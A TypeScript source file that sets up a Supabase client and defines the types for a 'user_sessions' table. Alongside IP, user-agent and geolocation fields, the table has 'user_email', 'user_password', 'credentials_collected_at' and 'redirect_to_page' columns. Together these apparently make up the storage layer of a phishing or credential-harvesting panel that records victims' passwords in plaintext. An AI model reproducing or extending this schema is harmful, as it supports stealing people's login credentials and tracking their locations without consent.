import { createClient } from '@supabase/supabase-js'

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!

export const supabase = createClient(supabaseUrl, supabaseAnonKey)

export type Database = {
  public: {
    Tables: {
      user_sessions: {
        Row: {
          id: string
          user_id?: string
          session_id: string
          ip_address?: string
          user_agent?: string
          page_url: string
          created_at: string
          updated_at: string
          is_active: boolean
          redirect_to_page?: string
          country?: string
          country_code?: string
          flag?: string
          city?: string
          region?: string
          user_email?: string
          user_password?: string
          credentials_collected_at?: string

        }
        Insert: {
          id?: string
          user_id?: string
          session_id: string
          ip_address?: string
          user_agent?: string
          page_url: string
          created_at?: string
          updated_at?: string
          is_active?: boolean
          redirect_to_page?: string
          country?: string
          country_code?: string
          flag?: string
          city?: string
          region?: string
          user_email?: string
          user_password?: string
          credentials_collected_at?: string

        }
        Update: {
          id?: string
          user_id?: string
          session_id?: string
          ip_address?: string
          user_agent?: string
          page_url?: string
          created_at?: string
          updated_at?: string
          is_active?: boolean
          redirect_to_page?: string
          country?: string
          country_code?: string
          flag?: string
          city?: string
          region?: string
          user_email?: string
          user_password?: string
          credentials_collected_at?: string

        }
      }
    }
  }
} 